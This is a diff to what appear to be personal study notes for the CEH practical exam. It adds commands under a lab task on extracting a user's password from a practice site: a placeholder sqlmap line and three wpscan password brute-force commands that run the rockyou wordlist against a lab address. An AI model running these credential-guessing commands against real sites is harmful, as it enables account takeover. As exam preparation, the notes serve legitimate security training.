@@ -1141,7 +1141,11 @@ You are provided a username/password for a website. Use SQL Injection attack to 
 Perform the SQL injection attack on your target web application cinema.cehorg.com and extract the password of a user Sarah. 
 You have already registered on the website with credentials Karen/computer.
 
-wpscan ...
+sqlmap -u xxxx
+
+wpscan --usernames sara -P password.txt --url http://192.168.0.222:8080/CEH/
+wpscan --url http://192.168.0.222:8080/CEH/ --passwords /home/rockyou.txt
+wpscan --url http://192.168.0.222:8080/CEH/ -e u --passwords /home/rockyou.txt
 
 -----------------------------------------------------------------------------------------------------------
 Analyze IoT traffic. Identify the packet with the publish message and enter the length or % humidity:
@@ -1633,6 +1637,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
